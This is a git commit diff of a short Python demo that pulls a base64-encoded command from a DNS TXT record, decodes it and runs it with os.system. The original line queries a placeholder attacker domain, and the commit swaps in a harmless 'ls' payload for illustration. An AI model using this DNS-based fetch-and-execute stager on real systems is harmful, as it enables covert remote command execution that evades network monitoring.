bf1f8dd72bd4f5ab2b024115045401154b6113a4
karan bamal <51521112+abankalarm@users.noreply.github.com>
2020-11-09 13:40:17 +0530

    Update demo.py

--- demo.py
+++ demo.py
@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 ## first we choose a command that is available on all linux systems
 # example host
 import subprocess
@@ -5,12 +7,17 @@ import base64
 import re
 import os
 ##first we retrieve our payload
-x= subprocess.Popen(["host","-t","txt","Our-domain_here.txt"], stdout=subprocess.PIPE).communicate()[0]
+x= subprocess.Popen(["host","-t","txt","google.com"], stdout=subprocess.PIPE).communicate()[0]
+x = x.decode()
 y = re.findall('"([^"]*)"', x)[0]
 
 print(y) ## for your understanding
 ##then we b64 decode it, b64 encoding allows us to send over a really complex payload
+## to show its work, since we dont have a domain 
+y = "bHM="
 c= base64.b64decode(y)
+print("our deofuscated payload")
 print(c) ## for your understanding
 ##now execute command
+print("our command result")
 os.system(c)
